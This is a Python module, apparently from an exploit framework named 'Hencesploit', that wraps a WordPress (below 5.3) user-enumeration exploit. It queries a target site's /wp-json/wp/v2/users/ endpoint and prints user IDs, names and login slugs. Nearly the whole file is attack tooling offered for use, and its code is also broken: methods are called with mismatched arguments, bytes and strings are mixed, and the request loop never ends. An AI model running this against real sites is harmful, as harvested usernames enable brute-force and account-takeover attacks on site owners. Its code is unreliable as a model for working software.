import json
from imp import reload
import requests
from cmd import Cmd
import sys,os
import urllib3
from colored import fg, attr
from terminaltables import AsciiTable
from core.help_menus import project_help
key = ['URL']   # CHANGE HERE YOUR PROJECT PARAMETERS
values = [""]                    # ADD DEFAULT VALUES OR LEAVE BLANKS TO BE CONFIGURED LATER
req = ['Yes']              # IF THE PARAMETER IS REQUIRED ADD YES ELSE ADD NO
class Simplewordpress(Cmd):              # CHANGE HERE( USE THE SAME NAME OF YOUR FOLDER AND PYTHON FILE TO NAME YOUR CLASS )
    prompt = '%sHencesploit > %s' % (fg(105), attr(0)) + '%s USE >%s' % (fg(202), attr(0)) + '%s (%s'% (fg(196), attr(0)) + __name__ + '%s) > %s' % (fg(196), attr(0))

    def do_exploit(self, line):    # YOU CAN RUN YOUR EXPLOIT OR AUXILIARY FROM HERE
        try:
            wordpressexploit.clear(self)
            wordpressexploit.Banner(self)
            wordpressexploit.Desc(self,url=values[0])
            wordpressexploit.data(self)
        except:
            print("%s please check your arguments %s"% (fg(160), attr(0)))

    def do_show(self, line):
        if line == 'options':
            table_data = [['OPTION', 'VALUE', 'REQUIRED']]
            for i in range(0, len(key)):
                table_data.append([key[i], values[i], req[i]])
            table = AsciiTable(table_data)
            print(table.table)

        else:
            print("%son development%s" % (fg(196), attr(0)))

    def do_set(self, line):
        try:
            meta_values=[]
            x=" "
            meta= line.split(' ')
            k=meta[0].upper()
            for i in range(1,len(meta)):
                meta_values=meta_values+[meta[i]]
            v=x.join(meta_values)
            if k=='' or v == '' :
                print("%s*** Unknown Option! option not has value!%s"% (fg(160), attr(0)))
                pass

            for i in range(0, len(key)):
                if k == key[i]:
                    values[i] = v
                    print(k, "===> ", v)
                    break
                else :
                    if i==len(key)-1:
                        print("%s*** Unknown Option! option not has value!%s"% (fg(160), attr(0)))
                    else:
                        pass

        except KeyError:
            print("%s*** Unknown Option! option not has value!%s"% (fg(160), attr(0)))
        except ValueError:
            print("%s*** Option not has value!%s"% (fg(160), attr(0)))
            print("%s*** Example : set lhost 127.0.0.1%s"% (fg(160), attr(0)))

    def do_back(self, line):
        module = globals()
        m = module['Simplewordpress']   # CHANGE HERE ( NAME OF YOUR CLASSE IN ['CLASSE_NAME'])
        splits = m.prompt.split(' > ')
        if len(splits) == 1:
            return True
        else:
            m.prompt = ' > '.join(splits[:-1]) + ' > '
            return True

    def do_help(self, arg):
        project_help.help()



class wordpressexploit():
    def __init__(self,url):
        self.url=url
    def clear(self):
        linux = 'clear'
        windows = 'cls'
        os.system([linux, windows][os.name == 'nt'])

    def Banner(self):
        print('''
    - Wordpress < 5.3 - User Enumeration
    - SajjadBnd
    ''')

    def Desc(self,url):
        vuln = url + "/wp-json/wp/v2/users/"
        while True:
            try:
                r = requests.get(vuln, verify=False)
                content = json.loads(r.text)
                wordpressexploit.data(content)
            except requests.exceptions.MissingSchema:
                vuln = "http://" + vuln

    def data(self,content):
        for x in content:
            name = x["name"].encode('UTF-8')
        print("======================")
        print("[+] ID : " + str(x["id"]))
        print("[+] Name : " + name)
        print("[+] User : " + x["slug"])
        sys.exit(1)




if __name__ == '__main__':
    Simplewordpress().cmdloop()           # CHANGE HERE (NAME OF YOUR CLASSE IN CLASSE().CMDLOOP())
    wordpressexploit()